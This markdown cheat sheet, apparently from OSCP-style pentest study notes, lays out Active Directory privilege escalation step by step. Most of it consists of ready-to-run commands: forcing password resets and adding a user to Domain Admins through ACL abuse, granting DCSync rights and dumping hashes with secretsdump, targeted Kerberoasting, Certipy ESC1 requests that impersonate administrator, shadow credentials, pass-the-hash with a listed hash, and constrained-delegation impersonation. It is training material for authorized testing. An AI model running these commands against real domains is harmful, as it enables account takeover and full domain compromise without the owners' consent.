# ⬆️ 05 — Privilege Escalation (AD)

---

## Attack Order

```
1. BloodHound → map all paths from owned accounts to Domain Admin
2. ACL abuse → WriteDACL / GenericAll / GenericWrite / ForceChangePassword
3. ADCS / Certipy → ESC1 / ESC4 / Shadow Credentials
4. Delegation attacks → Unconstrained / Constrained / RBCD
5. GPO abuse → GenericWrite on GPO object
```

---

## Environment Setup

```bash
export ip=10.10.10.x
export dcip=172.16.1.5
export domain=OSCP.EXAM
export user=username
export pass=password
export nthash=NTHASH
```

---

## ACL / Object Permissions Reference

```
GenericAll        → Full control over the object (reset password, add to groups, etc.)
GenericWrite      → Edit certain attributes (set SPN → targeted Kerberoast)
WriteOwner        → Change ownership of the object
WriteDACL         → Edit ACEs applied to object (add DCSync rights)
AllExtendedRights → Change password, reset password, etc.
ForceChangePassword → Password change without knowing current password
Self (Self-Membership) → Add ourselves to a group
```

---

## BloodHound — Path Finding

```bash
# Start BloodHound CE
cd /home/kali/Arsenal/ActiveDirectory/BloodHoundCE
sudo docker-compose up -d

# Collect data (Kali → LDAP)
sudo nxc ldap $ip -u $user -p $pass --bloodhound --collection All --dns-server $ip

# Import zip → http://localhost:8080
# Mark owned nodes: right-click → "Mark as Owned"

# Key queries:
# Shortest Paths to Domain Admins from Owned
# Find Principals with DCSync Rights
# Find AS-REP Roastable Users
# Find Kerberoastable Users
# Computers where Domain Users are Local Admin
```

---

## ACL Abuse

### GenericAll on User → Force Change Password

```bash
# net rpc (from Kali — no Windows tool needed)
net rpc password targetuser NewPass123! -U "$domain/$user%$pass" -S $ip

# PowerView (on Windows target)
Set-DomainUserPassword -Identity targetuser \
  -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
```

### GenericAll on Group → Add Self to Domain Admins

```bash
# net rpc
net rpc group addmem "Domain Admins" $user -U "$domain/$user%$pass" -S $ip

# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members $user
```

### WriteDACL on Domain Object → Add DCSync Rights

```bash
# PowerView (on Windows target)
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity $user -Rights DCSync

# Then DCSync from Kali
sudo impacket-secretsdump $domain/$user:$pass@$ip -just-dc-ntlm
```

### GenericWrite → Targeted Kerberoasting

```bash
# Set SPN on target → Kerberoast them
# PowerView
Set-DomainObject -Identity targetuser \
  -Set @{serviceprincipalname="fake/BLAH"}

# Then Kerberoast
sudo impacket-GetUserSPNs $domain/$user:$pass -dc-ip $ip -request
```

### ForceChangePassword

```bash
# net rpc
net rpc password targetuser NewPass123! -U "$domain/$user%$pass" -S $ip
```

---

## ADCS / Certipy

### Find Vulnerable Templates

```bash
# Output to terminal
sudo certipy-ad find -u $user@$domain -p $pass -dc-ip $ip -vulnerable -stdout

# Save to file
sudo certipy-ad find -u $user@$domain -p $pass -dc-ip $ip \
  -vulnerable -text -output certs/certipy.txt

# Check for dangerous enrollment rights
cat -n certs/certipy.txt | grep -iC4 'enrollment rights' | \
  grep -iE 'Enterprise Admins|Domain Admins|Domain Controllers'

# What you need from certipy output:
# - CA Name     → e.g. thm-LABYRINTH-CA
# - DNS Name    → e.g. labyrinth.thm.local
# - Template    → e.g. ServerAuth
```

### ESC1 — Request Certificate as Administrator

```bash
# Request cert specifying administrator UPN
sudo certipy-ad req \
  -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' \
  -dc-ip $ip \
  -target 'labyrinth.thm.local' \
  -ca 'thm-LABYRINTH-CA' \
  -template 'ServerAuth' \
  -upn 'administrator@thm.local'

# Or request as another privileged account
sudo certipy-ad req \
  -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' \
  -dc-ip $ip \
  -target 'labyrinth.thm.local' \
  -ca 'thm-LABYRINTH-CA' \
  -template 'ServerAuth' \
  -upn 'BRADLEY_ORTIZ@thm.local'
```

### Authenticate with Certificate → Get NTLM Hash

```bash
sudo certipy-ad auth -pfx 'administrator.pfx' -dc-ip $ip
sudo certipy-ad auth -pfx 'bradley_ortiz.pfx' -dc-ip $ip
# Output: NTLM hash → use for PTH
```

### Pass-the-Hash with Obtained Hash

```bash
sudo impacket-psexec BRADLEY_ORTIZ@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d
```

### Fix Clock Skew (Kerberos errors)

```bash
# Required if certipy auth fails with clock skew error
rdate -n $ip
sudo ntpdate $ip
```

### Shadow Credentials

```bash
# Requires GenericWrite or WriteProperty on target account
sudo certipy-ad shadow auto \
  -u $user@$domain -p $pass -dc-ip $ip -account TargetUser
# Returns NT hash of TargetUser
```

---

## Delegation Attacks

### Find Delegation Accounts

```bash
# Unconstrained delegation
nxc ldap $ip -u $user -p $pass -M get-uncon-delegatable

# Constrained delegation
nxc ldap $ip -u $user -p $pass -M get-con-delegatable

# BloodHound queries:
# "Find Computers with Unconstrained Delegation"
# "Find Computers with Constrained Delegation"
```

### Constrained Delegation → Impersonate Administrator

```bash
# Request service ticket as administrator
sudo impacket-getST -spn cifs/$ip \
  $domain/$user:$pass \
  -impersonate administrator \
  -dc-ip $ip

export KRB5CCNAME=administrator.ccache
sudo impacket-psexec -k -no-pass administrator@$ip
```

---

## Checklist

```
[ ] BloodHound ingested → owned nodes marked
[ ] Shortest path to DA identified
[ ] ACL edges reviewed (WriteDACL / GenericAll / GenericWrite / ForceChangePassword)
[ ] ADCS templates enumerated → certipy-ad find -vulnerable
[ ] ESC1 attempted if template allows arbitrary SAN
[ ] Cert obtained → auth → NTLM hash → PTH
[ ] Clock synced before certipy auth (ntpdate)
[ ] Delegation accounts identified and tested
[ ] Any new credentials/hashes recorded
```

---

**MITRE ATT&CK:** T1484 (Domain Policy Modification) · T1649 (Steal/Forge Auth Certs) · T1558 (Steal/Forge Kerberos Tickets) · T1134 (Access Token Manipulation)

[← Lateral Movement](../04-lateral-movement/README.md) | [Next: Domain Dominance →](../06-domain-dominance/README.md)
